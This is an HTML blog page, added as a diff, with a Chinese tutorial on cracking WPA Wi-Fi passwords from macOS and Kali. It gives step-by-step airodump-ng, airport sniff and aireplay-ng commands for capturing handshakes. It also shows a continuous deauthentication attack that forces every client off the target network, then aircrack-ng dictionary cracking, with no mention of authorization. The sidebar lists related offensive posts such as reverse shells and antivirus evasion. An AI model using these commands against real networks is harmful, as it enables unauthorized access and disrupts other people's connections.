@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>MAC&amp;KALI进行WiFi破解 | rebootORZ</title>
+<meta name="description" content="一名默默无闻的攻城狮">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="shortcut icon" href="https://rebootorz.github.io/favicon.ico?v=1610814095133">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://unpkg.com/papercss@1.6.1/dist/paper.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://rebootorz.github.io/styles/main.css">
+
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-KB4J95VFFD"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-KB4J95VFFD');
+</script>
+
+
+  </head>
+  <body>
+  
+    <nav class="navbar border fixed split-nav">
+  <div class="nav-brand">
+    <h3><a href="https://rebootorz.github.io">rebootORZ</a></h3>
+  </div>
+  <div class="collapsible">
+    <input id="collapsible1" type="checkbox" name="collapsible1">
+    <button>
+      <label for="collapsible1">
+        <div class="bar1"></div>
+        <div class="bar2"></div>
+        <div class="bar3"></div>
+      </label>
+    </button>
+    <div class="collapsible-body">
+      <ul class="inline">
+        
+          <li>
+            
+              <a href="/" class="menu">
+                首页
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/archives" class="menu">
+                归档
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/tags" class="menu">
+                标签
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/post/about" class="menu">
+                关于
+              </a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div id="top" class="row site">
+      <div class="sm-12 md-8 col">
+        <div class="paper">
+          <article class="article">
+            <h1>MAC&amp;KALI进行WiFi破解</h1>
+            <p class="article-meta">
+              2021-01-17
+              
+                <a href="https://rebootorz.github.io/tag/4EHijLUV6/" class="badge secondary">
+                  物联网安全
+                </a>
+              
+            </p>
+            
+            <div class="post-content">
+              <h1 id="大致原理">大致原理</h1>
+<p>通过发送断开连接的请求，使得所有连接了目标WI-FI的设备全都断开连接，设备会重新连接，然后监听其中一个设备与WI-FI建立连接时的握手包，其中包含了密码的密闻，然后使用aircrack-ng进行离线破解。</p>
+<h1 id="扫描附近ssid">扫描附近SSID</h1>
+<p>此类工具有很多，例如MAC下的airport、kali自带的airodump-ng等</p>
+<h2 id="mac下airport">MAC下airport</h2>
+<pre><code>执行命令获取附近SSID
+sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s
+设置快捷键后变成：
+airport -s
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://rebootorz.github.io/post-images/82407601.png" alt="" loading="lazy"></figure>
+<h2 id="kali下airodump-ng">Kali下airodump-ng</h2>
+<p><strong>注：</strong><br>
+(1)这个特殊一点需要进行一些设置<br>
+(2)要有外置的 支持 kali 的 usb 无线网卡，虚拟机要把vmware的usb服务和网卡启用。</p>
+<h3 id="查看网卡信息">查看网卡信息</h3>
+<p>看下当前外接的网卡名字：</p>
+<pre><code>sudo airmon-ng
+或者
+ifconfig 
+</code></pre>
+<p>**注：**网卡推荐使用RTL8187 因为平常我们用的很多网卡Kali是不支持的，而支持的网卡里面，这款是性价比比较高的。<br>
+<img src="https://rebootorz.github.io/post-images/83054299.png" alt="" loading="lazy"></p>
+<h3 id="开启监听模式">开启监听模式</h3>
+<p><img src="https://rebootorz.github.io/post-images/83208219.png" alt="" loading="lazy"><br>
+开启监听后，此时网卡名字为wlan0mon</p>
+<h3 id="扫描ssid">扫描SSID</h3>
+<figure data-type="image" tabindex="2"><img src="https://rebootorz.github.io/post-images/83587194.png" alt="" loading="lazy"></figure>
+<h1 id="抓握手包">抓握手包</h1>
+<p>然后选择一个你要破解的WI-FI，记录下它的BSSID（物理地址）、CH（CHANNEL）- 信道</p>
+<h2 id="mac">MAC</h2>
+<p>**注：**需要先安装aircrack-ng</p>
+<pre><code>brew install aircrack-ng
+</code></pre>
+<pre><code>开始监听
+airport en0 sniff 信道
+</code></pre>
+<p>此时WIFI的图标会变成一个黑点：<br>
+<img src="https://rebootorz.github.io/post-images/84941669.png" alt="" loading="lazy"><br>
+这个时候终端不会有其他提示：<br>
+<img src="https://rebootorz.github.io/post-images/84959878.png" alt="" loading="lazy"><br>
+等待一段时间后（尽量多等几分钟，等的越久抓到包的概率越大）,CTRL+C结束<br>
+然后会提示抓的包存放位置：<br>
+<img src="https://rebootorz.github.io/post-images/85038273.png" alt="" loading="lazy"><br>
+接下来需要确认这个包里是否抓到里握手包（是否包含密码信息）：</p>
+<pre><code>sudo aircrack-ng /tmp/airportSniffTRT4xj.cap
+</code></pre>
+<p>**注：**因为同一个信道可能并不止一个WI-FI信号在使用，所以会探测多个WI-FI<br>
+如下图，&quot;0 handshake&quot;说明没有抓到握手包，这里因为是演示过程，所以没有抓太久。<br>
+<img src="https://rebootorz.github.io/post-images/85191494.png" alt="" loading="lazy"></p>
+<h2 id="kali">Kali</h2>
+<pre><code>sudo airodump-ng -c 信道 --bssid 物理地址 -w ~/ wlan0mon
+</code></pre>
+<p>STATION就是当前正在与WI-FI通信的设备：<br>
+<img src="https://rebootorz.github.io/post-images/85322581.png" alt="" loading="lazy"><br>
+然后另外开启一个终端，发送deauth包：</p>
+<pre><code>sudo aireplay-ng -0 0 -a WIFI物理地址 -c 用户设备物理地址 wlan0mon
+参数 -0 3 表示发送3次，-0 0 表示持续发送。
+</code></pre>
+<p><img src="https://rebootorz.github.io/post-images/85501924.png" alt="" loading="lazy"><br>
+可以看到被攻击的设备Lost和Frames的次数不断增加：<br>
+<img src="https://rebootorz.github.io/post-images/85542877.png" alt="" loading="lazy"><br>
+当抓到握手包后，提示如下：<br>
+<img src="https://rebootorz.github.io/post-images/85600916.png" alt="" loading="lazy"><br>
+此时就可以CTRL+C停止探测和发包的操作里。<br>
+此时会在当前目录下生成一个.cap的包：<br>
+<img src="https://rebootorz.github.io/post-images/85680069.png" alt="" loading="lazy"><br>
+**注：**默认生成的包名有个“-”后面执行破解的时候会被误认为参数的一部分从而报错，所以先改下名字，例如7.cap</p>
+<h1 id="破解握手包密码">破解握手包密码</h1>
+<h2 id="mac-2">MAC</h2>
+<pre><code>sudo aircrack-ng /tmp/airportSniffnP4T3X.cap -w 字典路径
+</code></pre>
+<p>根据提示输入要破解的WI-FI的序号即可，因为这里我没抓到握手包，所以会提示缺少EAPOL data。<br>
+<img src="https://rebootorz.github.io/post-images/86055708.png" alt="" loading="lazy"></p>
+<h2 id="kali-2">Kali</h2>
+<pre><code>sudo aircrack-ng /tmp/airportSniffnP4T3X.cap -w 字典路径
+</code></pre>
+<p>然后就开始破解里，当然这里除了需要运气好，还需要对目标足够的了解，能够提前根据目标特点构造字典。<br>
+<img src="https://rebootorz.github.io/post-images/86247210.png" alt="" loading="lazy"><br>
+爆破成功后自带结束并显示密码：<br>
+<img src="https://rebootorz.github.io/post-images/212397.png" alt="" loading="lazy"><br>
+因为一般情况下受限于字典，所以会跑一些很大的字典，例如几个G大小的字典，这个就需要较快处理能力的机器，例如可以用台式机来跑。</p>
+
+            </div>
+          </article>
+        </div>
+        <div class="paper" data-aos="fade-in">
+          
+            <div class="next-post">
+              <div class="next">
+                下一篇
+              </div>
+              <a href="https://rebootorz.github.io/AzVbzRuN4/">
+                <h3 class="post-title">
+                  node.js反弹shell
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+        
+      </div>
+
+      <div class="sm-12 md-4 col sidebar">
+  <div class="paper info-container">
+    <img src="https://rebootorz.github.io/images/avatar.png?v=1610814095133" class="no-responsive avatar">
+    <div class="text-muted">一名默默无闻的攻城狮</div>
+    <div class="social-container">
+      
+        
+          <a href="https://github.com/rebootORZ" target="_blank">
+            <i class="fab fa-github"></i>
+          </a>
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      最新文章
+    </div>
+    <div class="row">
+      <ul>
+        
+          
+            <li>
+              <a href="https://rebootorz.github.io/LSzteQmAT/">MAC&amp;KALI进行WiFi破解</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://rebootorz.github.io/AzVbzRuN4/">node.js反弹shell</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://rebootorz.github.io/HdxsJLVVU/">Invoke-Obfuscation实现ps1脚本免杀</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://rebootorz.github.io/6jdjqWmOL/">Powershell免杀上线</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://rebootorz.github.io/T5B_aJTTL/">FRP多层穿透实战</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://rebootorz.github.io/jian-dan-chuan-tou/">简单穿透</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://rebootorz.github.io/WiFI-Pineapple-Evil-Portal/">WiFi Pineapple之Evil Portal</a>
+            </li>
+          
+        
+      </ul>
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      标签列表
+    </div>
+    <div class="row">
+      
+        <a href="https://rebootorz.github.io/tag/4EHijLUV6/" class="badge secondary">
+          物联网安全
+        </a>
+      
+        <a href="https://rebootorz.github.io/tag/BjedM9kLx/" class="badge warning">
+          红队
+        </a>
+      
+    </div>
+  </div>
+  <div class="paper">
+    高度自律  绝对自由 | <a class="rss" href="https://rebootorz.github.io/atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+
+
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+</script>
+
+
+
+
+  </body>
+</html>
